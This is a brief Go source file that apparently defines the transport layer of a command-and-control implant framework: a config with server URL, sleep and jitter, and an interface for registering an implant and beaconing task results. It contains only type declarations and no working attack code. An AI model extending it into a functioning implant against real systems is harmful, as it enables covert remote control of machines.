package transport

import "github.com/carved4/carved/shared/proto"

type Config struct {
	ServerURL	string
	Sleep		uint32
	Jitter		uint8
	UserAgent	string
	Headers		[]Header
}

type Header struct {
	Key	string
	Value	string
}

type Transport interface {
	Beacon(results []*proto.TaskResult) ([]*proto.Task, error)

	Register(meta *proto.ImplantMeta) error
}

